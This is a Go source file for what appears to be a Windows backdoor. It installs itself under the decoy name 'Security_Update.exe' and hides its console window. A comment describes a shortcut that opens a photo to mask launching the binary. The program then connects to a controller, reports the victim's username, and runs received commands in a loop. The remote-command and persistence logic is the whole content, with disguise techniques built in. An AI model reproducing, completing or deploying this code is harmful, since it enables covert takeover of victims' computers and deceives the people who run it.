//go:generate goversioninfo -icon=icon.ico
//Compile: go build -ldflags "-s -w -H=windowsgui"

//Shortcut: C:\Windows\System32\cmd.exe /C foto.jpg && rolling-win.exe

//TODO handle client disconection

package main

import (
	"strings"
	"time"
)


const TARGET_FILE_NAME = "Security_Update.exe"   // check name Wscript.exe

func main() {
	Install()
	c, _ = Connect()
	go Send("user", GetUsername())
	ListenAndExecute()
}

func ListenAndExecute() {
	for {
		status := Receive()
		go ParseProtocol(status)
	}

}

func ParseProtocol(r string) {
	commandBuff := strings.Split(r, " ")
		if len(commandBuff) > 1 {
			cmd := commandBuff[0]
			target := commandBuff[1]
			args := "null"
			if len(commandBuff) >= 3 {
				args = commandBuff[2]
			}
			//Concurrently executes command
			Execute(cmd, target, args)
		}
}

func Wait() {
	time.Sleep(30 * time.Second)
}
